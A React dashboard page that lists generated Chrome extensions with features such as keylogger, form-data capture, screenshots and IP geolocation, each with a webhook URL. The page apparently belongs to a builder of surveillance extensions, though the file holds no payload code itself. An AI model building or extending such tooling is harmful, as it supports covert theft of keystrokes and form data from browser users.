import { useQuery } from "@tanstack/react-query";
import { useState } from "react";
import { Search, ChevronLeft, ChevronRight, Activity, Shield, Globe, Eye, FileText, Mouse, Keyboard, Bug, Download, CheckCircle, XCircle, AlertTriangle, Cpu } from "lucide-react";
import Sidebar from "@/components/dashboard/sidebar";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";

interface ExtensionLog {
  id: string;
  userId: string;
  extensionName: string;
  extensionDescription: string;
  extensionVersion: string;
  permissions: string[];
  features: string[];
  webhookUrl: string;
  customCode: string;
  generationStatus: "success" | "error" | "validation_failed";
  errorMessage?: string;
  downloadCount: number;
  extensionId: string;
  ipAddress: string;
  userAgent: string;
  location: string;
  zipFileSize: number;
  manifestValid: boolean;
  scriptsValid: boolean;
  createdAt: string;
  lastWebhookSent?: string;
}

interface ExtensionLogsResponse {
  logs: ExtensionLog[];
  total: number;
}

const CY = {
  font: "Orbitron, sans-serif",
  mono: "JetBrains Mono, monospace",
  cyan: "#00f5ff",
  green: "#00ff9f",
  red: "#ff5050",
  yellow: "#ffc800",
  purple: "#a050ff",
  orange: "#ff6400",
};

const featureIcons: Record<string, any> = {
  ip_tracking: Globe, geolocation: Globe, browser_info: Shield,
  screenshot: Eye, form_data: FileText, click_tracking: Mouse, keylogger: Keyboard,
};

const featureColors: Record<string, string> = {
  ip_tracking: CY.cyan, geolocation: CY.cyan, browser_info: CY.purple,
  screenshot: CY.yellow, form_data: CY.green, click_tracking: CY.orange, keylogger: CY.red,
};

function formatBytes(b: number) {
  if (b < 1024) return `${b} B`;
  if (b < 1024 * 1024) return `${(b / 1024).toFixed(1)} KB`;
  return `${(b / (1024 * 1024)).toFixed(1)} MB`;
}

function CyberInput({ value, onChange, placeholder, icon: Icon }: any) {
  return (
    <div className="relative">
      {Icon && <Icon className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5" style={{ color: "rgba(0,245,255,0.4)" }} />}
      <input value={value} onChange={onChange} placeholder={placeholder}
        className="w-full py-2 pr-3 text-xs outline-none transition-all"
        style={{ paddingLeft: Icon ? "32px" : "12px", background: "rgba(0,245,255,0.04)", border: "1px solid rgba(0,245,255,0.2)", color: "#e0f8ff", fontFamily: CY.mono, fontSize: "11px" }}
        onFocus={e => { e.currentTarget.style.borderColor = "rgba(0,245,255,0.5)"; }}
        onBlur={e => { e.currentTarget.style.borderColor = "rgba(0,245,255,0.2)"; }}
      />
    </div>
  );
}

function StatusBadge({ status }: { status: string }) {
  const map: Record<string, { color: string; icon: any; label: string }> = {
    success:          { color: CY.green,  icon: CheckCircle,    label: "SUCCESS" },
    error:            { color: CY.red,    icon: XCircle,        label: "ERROR" },
    validation_failed:{ color: CY.yellow, icon: AlertTriangle,  label: "VALIDATION FAILED" },
  };
  const cfg = map[status] || { color: CY.cyan, icon: Bug, label: status.toUpperCase() };
  const Icon = cfg.icon;
  return (
    <span className="flex items-center gap-1 px-2 py-0.5 text-[9px] font-bold tracking-widest"
      style={{ color: cfg.color, background: `${cfg.color}12`, border: `1px solid ${cfg.color}44`, fontFamily: CY.font, letterSpacing: "0.1em" }}>
      <Icon className="w-2.5 h-2.5" />
      {cfg.label}
    </span>
  );
}

function CyberBtn({ children, onClick, disabled, small }: any) {
  return (
    <button onClick={onClick} disabled={disabled}
      className={`flex items-center gap-1.5 ${small ? "px-2 py-1 text-[9px]" : "px-3 py-1.5 text-[10px]"} font-bold tracking-widest transition-all hover:scale-105 disabled:opacity-40`}
      style={{ background: "rgba(0,245,255,0.08)", border: "1px solid rgba(0,245,255,0.3)", color: CY.cyan, fontFamily: CY.font, letterSpacing: "0.15em", cursor: disabled ? "not-allowed" : "pointer" }}>
      {children}
    </button>
  );
}

export default function ExtensionLogs() {
  const [currentPage, setCurrentPage] = useState(1);
  const [search, setSearch] = useState("");
  const [statusFilter, setStatusFilter] = useState("all");
  const [featureFilter, setFeatureFilter] = useState("all");
  const logsPerPage = 20;

  const { data, isLoading } = useQuery<ExtensionLogsResponse>({
    queryKey: ["/api/extension-logs", { limit: logsPerPage, offset: (currentPage - 1) * logsPerPage }],
    refetchInterval: 5000,
  });

  const filteredLogs = data?.logs.filter(log => {
    const matchSearch =
      log.extensionName.toLowerCase().includes(search.toLowerCase()) ||
      log.extensionDescription.toLowerCase().includes(search.toLowerCase()) ||
      log.ipAddress.toLowerCase().includes(search.toLowerCase()) ||
      log.location.toLowerCase().includes(search.toLowerCase()) ||
      log.extensionId.toLowerCase().includes(search.toLowerCase());
    const matchStatus = statusFilter === "all" || log.generationStatus === statusFilter;
    const matchFeature = featureFilter === "all" || log.features.includes(featureFilter);
    return matchSearch && matchStatus && matchFeature;
  }) || [];

  const totalPages = Math.ceil((data?.total || 0) / logsPerPage);

  return (
    <div className="flex h-screen overflow-hidden relative" style={{ background: "#000508" }}>
      {/* Scan lines */}
      <div className="fixed inset-0 pointer-events-none z-0 opacity-[0.015]"
        style={{ backgroundImage: "repeating-linear-gradient(0deg,#00f5ff 0px,#00f5ff 1px,transparent 1px,transparent 4px)" }} />
      <div className="fixed top-0 left-64 w-96 h-64 pointer-events-none z-0 opacity-10"
        style={{ background: "radial-gradient(circle at top, rgba(255,100,0,0.3), transparent 70%)" }} />

      <Sidebar />

      <main className="flex-1 overflow-auto relative z-10 pb-16 md:pb-0" style={{ minWidth: 0 }}>
        {/* Header */}
        <header className="sticky top-0 z-20 px-4 md:px-6 py-4 border-b"
          style={{ background: "rgba(0,4,12,0.97)", borderColor: "rgba(255,100,0,0.2)", backdropFilter: "blur(20px)" }}>
          <div className="absolute top-0 left-0 right-0 h-px"
            style={{ background: "linear-gradient(90deg, transparent, rgba(255,100,0,0.6) 30%, rgba(255,200,0,0.6) 70%, transparent)" }} />
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <Activity className="w-4 h-4" style={{ color: CY.orange, filter: "drop-shadow(0 0 6px rgba(255,100,0,0.8))" }} />
              <div>
                <h1 className="text-base md:text-lg font-black tracking-widest"
                  style={{ fontFamily: CY.font, color: CY.orange, textShadow: "0 0 15px rgba(255,100,0,0.5)", letterSpacing: "0.2em" }}>
                  EXTENSION LOGS
                </h1>
                <p className="text-[10px] tracking-widest" style={{ color: "rgba(0,245,255,0.4)", fontFamily: CY.mono }}>
                  // CHROME EXTENSION GENERATION & ACTIVITY RECORDS — {data?.total || 0} ENTRIES
                </p>
              </div>
            </div>
            <div className="flex items-center gap-2">
              <div className="w-1.5 h-1.5 rounded-full animate-pulse" style={{ background: CY.orange, boxShadow: `0 0 6px ${CY.orange}` }} />
              <span className="text-[10px] tracking-widest hidden md:block" style={{ color: "rgba(255,100,0,0.6)", fontFamily: CY.mono }}>LIVE UPDATES</span>
            </div>
          </div>
        </header>

        <div className="p-4 md:p-6 space-y-4">
          {/* Filters */}
          <div className="p-4 flex flex-col md:flex-row gap-3"
            style={{ background: "rgba(0,6,12,0.7)", border: "1px solid rgba(0,245,255,0.12)" }}>
            <div className="flex-1">
              <CyberInput value={search} onChange={(e: any) => setSearch(e.target.value)}
                placeholder="// search name, IP, location, extension ID..."
                icon={Search} />
            </div>
            <Select value={statusFilter} onValueChange={setStatusFilter}>
              <SelectTrigger className="w-full md:w-44 h-8 text-[10px]"
                style={{ background: "rgba(0,245,255,0.04)", border: "1px solid rgba(0,245,255,0.2)", color: "#e0f8ff", fontFamily: CY.font, fontSize: "10px", letterSpacing: "0.1em" }}>
                <SelectValue placeholder="STATUS" />
              </SelectTrigger>
              <SelectContent style={{ background: "#000d1a", border: "1px solid rgba(0,245,255,0.2)" }}>
                <SelectItem value="all">ALL STATUS</SelectItem>
                <SelectItem value="success">SUCCESS</SelectItem>
                <SelectItem value="error">ERROR</SelectItem>
                <SelectItem value="validation_failed">VALIDATION FAILED</SelectItem>
              </SelectContent>
            </Select>
            <Select value={featureFilter} onValueChange={setFeatureFilter}>
              <SelectTrigger className="w-full md:w-44 h-8 text-[10px]"
                style={{ background: "rgba(0,245,255,0.04)", border: "1px solid rgba(0,245,255,0.2)", color: "#e0f8ff", fontFamily: CY.font, fontSize: "10px", letterSpacing: "0.1em" }}>
                <SelectValue placeholder="FEATURE" />
              </SelectTrigger>
              <SelectContent style={{ background: "#000d1a", border: "1px solid rgba(0,245,255,0.2)" }}>
                <SelectItem value="all">ALL FEATURES</SelectItem>
                <SelectItem value="ip_tracking">IP TRACKING</SelectItem>
                <SelectItem value="geolocation">GEOLOCATION</SelectItem>
                <SelectItem value="browser_info">BROWSER INFO</SelectItem>
                <SelectItem value="screenshot">SCREENSHOTS</SelectItem>
                <SelectItem value="form_data">FORM DATA</SelectItem>
                <SelectItem value="click_tracking">CLICK TRACKING</SelectItem>
                <SelectItem value="keylogger">KEYSTROKE LOGGING</SelectItem>
              </SelectContent>
            </Select>
          </div>

          {/* Log list */}
          {isLoading ? (
            <div className="space-y-2">
              {[...Array(5)].map((_, i) => (
                <div key={i} className="h-24 animate-pulse" style={{ background: "rgba(0,6,12,0.7)", border: "1px solid rgba(0,245,255,0.07)" }} />
              ))}
            </div>
          ) : filteredLogs.length === 0 ? (
            <div className="flex flex-col items-center justify-center py-20"
              style={{ background: "rgba(0,6,12,0.5)", border: "1px solid rgba(0,245,255,0.08)" }}>
              <Activity className="w-10 h-10 mb-3" style={{ color: "rgba(0,245,255,0.2)" }} />
              <div className="text-[11px] tracking-widest" style={{ color: "rgba(0,245,255,0.3)", fontFamily: CY.font }}>
                {search || statusFilter !== "all" || featureFilter !== "all" ? "NO LOGS MATCH FILTER" : "NO EXTENSION LOGS YET"}
              </div>
            </div>
          ) : (
            <div className="space-y-2">
              {filteredLogs.map((log) => (
                <div key={log.id} className="transition-all duration-150"
                  style={{ background: "rgba(0,6,12,0.7)", border: "1px solid rgba(0,245,255,0.12)" }}
                  onMouseEnter={e => (e.currentTarget.style.borderColor = "rgba(0,245,255,0.25)")}
                  onMouseLeave={e => (e.currentTarget.style.borderColor = "rgba(0,245,255,0.12)")}
                  data-testid={`card-extension-${log.id}`}
                >
                  {/* Card header */}
                  <div className="px-4 py-3 border-b flex items-start justify-between gap-3"
                    style={{ borderColor: "rgba(0,245,255,0.08)", background: "rgba(0,8,20,0.5)" }}>
                    <div className="flex items-start gap-3 flex-1 min-w-0">
                      <div className="w-8 h-8 flex items-center justify-center flex-shrink-0"
                        style={{ background: "rgba(255,100,0,0.12)", border: "1px solid rgba(255,100,0,0.3)" }}>
                        <Download className="w-4 h-4" style={{ color: CY.orange }} />
                      </div>
                      <div className="min-w-0">
                        <div className="flex items-center gap-2 flex-wrap">
                          <span className="text-sm font-bold" style={{ color: "rgba(200,240,255,0.9)", fontFamily: "Rajdhani, sans-serif" }}>
                            {log.extensionName}
                          </span>
                          <span className="text-[9px] px-1.5 py-0.5" style={{ color: "rgba(0,245,255,0.5)", background: "rgba(0,245,255,0.06)", border: "1px solid rgba(0,245,255,0.15)", fontFamily: CY.mono }}>
                            v{log.extensionVersion}
                          </span>
                          <StatusBadge status={log.generationStatus} />
                        </div>
                        <div className="text-[10px] mt-0.5" style={{ color: "rgba(0,245,255,0.35)", fontFamily: CY.mono }}>
                          {log.extensionDescription}
                        </div>
                        <div className="text-[9px] mt-0.5 flex gap-3" style={{ color: "rgba(0,245,255,0.25)", fontFamily: CY.mono }}>
                          <span>ID: {log.extensionId.slice(0, 8)}…</span>
                          <span>{new Date(log.createdAt).toLocaleString()}</span>
                        </div>
                      </div>
                    </div>
                    <span className="text-[9px] flex-shrink-0 px-2 py-0.5"
                      style={{ color: "rgba(0,245,255,0.4)", background: "rgba(0,245,255,0.05)", border: "1px solid rgba(0,245,255,0.1)", fontFamily: CY.mono }}>
                      {log.downloadCount} DL
                    </span>
                  </div>

                  {/* Card body */}
                  <div className="px-4 py-3 space-y-3">
                    {/* Features */}
                    <div className="flex items-center gap-2 flex-wrap">
                      <span className="text-[9px] tracking-widest" style={{ color: "rgba(0,245,255,0.3)", fontFamily: CY.font, letterSpacing: "0.15em" }}>FEATURES:</span>
                      {log.features.map(f => {
                        const Icon = featureIcons[f] || Bug;
                        const color = featureColors[f] || CY.cyan;
                        return (
                          <span key={f} className="flex items-center gap-1 px-1.5 py-0.5 text-[9px]"
                            style={{ color, background: `${color}10`, border: `1px solid ${color}30`, fontFamily: CY.mono }}>
                            <Icon className="w-2.5 h-2.5" />{f.replace("_", " ")}
                          </span>
                        );
                      })}
                    </div>

                    {/* Permissions */}
                    <div className="flex items-center gap-2 flex-wrap">
                      <span className="text-[9px] tracking-widest" style={{ color: "rgba(0,245,255,0.3)", fontFamily: CY.font, letterSpacing: "0.15em" }}>PERMS:</span>
                      {log.permissions.map(p => (
                        <span key={p} className="text-[9px] px-1.5 py-0.5"
                          style={{ color: "rgba(0,245,255,0.5)", background: "rgba(0,245,255,0.05)", border: "1px solid rgba(0,245,255,0.12)", fontFamily: CY.mono }}>
                          {p}
                        </span>
                      ))}
                    </div>

                    {/* Technical details */}
                    <div className="grid grid-cols-2 md:grid-cols-4 gap-2 text-[10px]" style={{ fontFamily: CY.mono }}>
                      {[
                        { l: "IP ADDRESS", v: log.ipAddress, color: CY.green },
                        { l: "LOCATION",   v: log.location,  color: "rgba(200,240,255,0.7)" },
                        { l: "FILE SIZE",  v: formatBytes(log.zipFileSize), color: "rgba(200,240,255,0.7)" },
                        { l: "WEBHOOK",    v: log.webhookUrl ? "CONFIGURED" : "NONE", color: log.webhookUrl ? CY.green : CY.red },
                      ].map(item => (
                        <div key={item.l} className="p-2" style={{ background: "rgba(0,245,255,0.03)", border: "1px solid rgba(0,245,255,0.07)" }}>
                          <div className="text-[8px] mb-0.5" style={{ color: "rgba(0,245,255,0.35)", fontFamily: CY.font, letterSpacing: "0.1em" }}>{item.l}</div>
                          <div style={{ color: item.color }}>{item.v}</div>
                        </div>
                      ))}
                    </div>

                    {/* Validation status */}
                    <div className="flex gap-3">
                      {[
                        { l: "MANIFEST", ok: log.manifestValid },
                        { l: "SCRIPTS",  ok: log.scriptsValid },
                      ].map(item => (
                        <div key={item.l} className="flex items-center gap-1.5">
                          <span className="text-[9px] tracking-widest" style={{ color: "rgba(0,245,255,0.3)", fontFamily: CY.font }}>{item.l}:</span>
                          {item.ok
                            ? <CheckCircle className="w-3 h-3" style={{ color: CY.green }} />
                            : <XCircle className="w-3 h-3" style={{ color: CY.red }} />}
                          <span className="text-[9px]" style={{ color: item.ok ? CY.green : CY.red, fontFamily: CY.mono }}>{item.ok ? "VALID" : "INVALID"}</span>
                        </div>
                      ))}
                    </div>

                    {/* Error */}
                    {log.errorMessage && (
                      <div className="p-2 text-[10px]"
                        style={{ background: "rgba(255,80,80,0.06)", border: "1px solid rgba(255,80,80,0.2)", color: CY.red, fontFamily: CY.mono }}>
                        ERR: {log.errorMessage}
                      </div>
                    )}

                    {/* User agent */}
                    <div className="text-[9px] border-t pt-2" style={{ borderColor: "rgba(0,245,255,0.06)", color: "rgba(0,245,255,0.25)", fontFamily: CY.mono }}>
                      UA: {log.userAgent.length > 100 ? `${log.userAgent.slice(0, 100)}…` : log.userAgent}
                    </div>
                  </div>
                </div>
              ))}
            </div>
          )}

          {/* Pagination */}
          {totalPages > 1 && (
            <div className="flex items-center justify-between px-4 py-3"
              style={{ background: "rgba(0,6,12,0.7)", border: "1px solid rgba(0,245,255,0.1)" }}>
              <span className="text-[10px]" style={{ color: "rgba(0,245,255,0.4)", fontFamily: CY.mono }}>
                {Math.min((currentPage - 1) * logsPerPage + 1, data?.total || 0)}–{Math.min(currentPage * logsPerPage, data?.total || 0)} of {data?.total || 0}
              </span>
              <div className="flex items-center gap-1.5">
                <CyberBtn small disabled={currentPage === 1} onClick={() => setCurrentPage(p => Math.max(1, p - 1))}>
                  <ChevronLeft className="w-3 h-3" />PREV
                </CyberBtn>
                {[...Array(Math.min(5, totalPages))].map((_, i) => {
                  const n = i + 1;
                  return (
                    <button key={n} onClick={() => setCurrentPage(n)}
                      className="w-7 h-7 text-[9px] font-bold transition-all"
                      style={{
                        background: currentPage === n ? "rgba(0,245,255,0.15)" : "transparent",
                        border: `1px solid ${currentPage === n ? "rgba(0,245,255,0.4)" : "rgba(0,245,255,0.1)"}`,
                        color: currentPage === n ? CY.cyan : "rgba(0,245,255,0.4)",
                        fontFamily: CY.font, cursor: "pointer",
                      }}>{n}</button>
                  );
                })}
                <CyberBtn small disabled={currentPage === totalPages} onClick={() => setCurrentPage(p => Math.min(totalPages, p + 1))}>
                  NEXT<ChevronRight className="w-3 h-3" />
                </CyberBtn>
              </div>
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
